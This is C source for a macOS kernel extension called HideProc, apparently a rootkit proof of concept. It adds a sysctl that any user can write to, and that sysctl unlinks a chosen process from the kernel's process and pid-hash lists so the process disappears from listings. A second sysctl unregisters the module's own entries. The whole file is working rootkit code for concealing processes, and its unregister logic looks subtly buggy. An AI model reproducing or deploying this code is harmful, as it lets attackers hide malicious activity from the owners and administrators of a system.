/*
 *
 *
 * Author: Jesse 'x30n' D'Aguanno <x30n@digrev.org>
 * This software is placed in the public domain
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
#include <sys/types.h>
#include <sys/kernel_types.h>
#include <sys/systm.h>
#include <sys/sysctl.h>
#include <sys/proc.h>

#include <sys/param.h>
#include <sys/systm.h>

#include <sys/kauth.h>
#include <sys/unistd.h>
#include <sys/buf.h>
#include <sys/ioctl.h>
#include <sys/namei.h>
#include <sys/vm.h>
#include <sys/sysctl.h>

#include <mach/machine.h>
#include <mach/mach_types.h>
#include <mach/vm_param.h>
#include <kern/task.h>
#include <vm/vm_kern.h>
#include <vm/vm_map.h>
#include <mach/host_info.h>
#include <mach/task_info.h>
#include <mach/thread_info.h>
#include <mach/vm_region.h>

#include <sys/kdebug.h>

#include <machine/machine_routines.h>
#include <sys/appleapiopts.h>

#include "proc_internal.h"



static u_int32_t k_uint32 = 0;
static u_int32_t unregistered = 0;

SYSCTL_NODE(_debug,
			OID_AUTO,
			digrev,
			CTLFLAG_RW,
			0,
			"My sysctl");
			
static int sysctl_digrev_hidepid SYSCTL_HANDLER_ARGS;

SYSCTL_PROC(
	_debug_digrev,
	OID_AUTO,
	hidepid,
	(CTLTYPE_INT |
		CTLFLAG_RW | CTLFLAG_ANYBODY),
	&k_uint32,
	0,
	sysctl_digrev_hidepid,
	"IU",
	"32-bit unsigned integer"
);


static int sysctl_digrev_unreg SYSCTL_HANDLER_ARGS;

SYSCTL_PROC(
	_debug_digrev,
	OID_AUTO,
	unreg,
	(CTLTYPE_INT |
		CTLFLAG_RW | CTLFLAG_ANYBODY),
	&unregistered,
	0,
	sysctl_digrev_unreg,
	"IU",
	"Unregisters sysctls"
);

static int hide_proc(pid_t pid) {
//	struct extern_proc *p;
struct proc * p;


	proc_list_lock();
	
//	LIST_FOREACH(p, PIDHASH(pid), p_hash)
	LIST_FOREACH(p, &allproc, p_list)
		
		if(p->p_pid == pid) {
			/*if(p->p_state == PRS_NEW) {
				p = NULL;
				break;
			}*/
			/*Different from BSD (sx_lock)*/
			proc_lock(p);
			
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
			//LIST_REMOVE(p, p_sibling);
			
			proc_unlock(p);
			
			break;
		}
	/*Different from BSD (sx_unlock)*/
	proc_list_unlock();
	return(0);
}
	
static int sysctl_digrev_hidepid SYSCTL_HANDLER_ARGS {
			int error;
			error = sysctl_handle_int(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
			if (!error && req->newptr) { 
				//printf("debug.digrev.hidepid: stored %d\n", k_uint32); 
				printf("Hiding pid %d\n", k_uint32);
				hide_proc(k_uint32); 

			} 
			
			return error;
}

static int sysctl_digrev_unreg SYSCTL_HANDLER_ARGS {
			int error;
			error = sysctl_handle_int(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
			if (!error && req->newptr) { 
				//printf("debug.digrev.hidepid: stored %d\n", k_uint32);
				if(unregistered != 0) {
					sysctl_unregister_oid(&sysctl__debug_digrev_unreg);
					sysctl_unregister_oid(&sysctl__debug_digrev_hidepid);
					sysctl_unregister_oid(&sysctl__debug_digrev);
					unregistered = 1;
				}

			} 
			
			return error;
}


kern_return_t HideProc_start (kmod_info_t * ki, void * d) {
	sysctl_register_oid(&sysctl__debug_digrev);
	sysctl_register_oid(&sysctl__debug_digrev_hidepid);
	sysctl_register_oid(&sysctl__debug_digrev_unreg);
    return KERN_SUCCESS;
}


kern_return_t HideProc_stop (kmod_info_t * ki, void * d) {
	if(unregistered != 1) {
		sysctl_unregister_oid(&sysctl__debug_digrev_unreg);
		sysctl_unregister_oid(&sysctl__debug_digrev_hidepid);
		sysctl_unregister_oid(&sysctl__debug_digrev);
	}
    return KERN_SUCCESS;
}
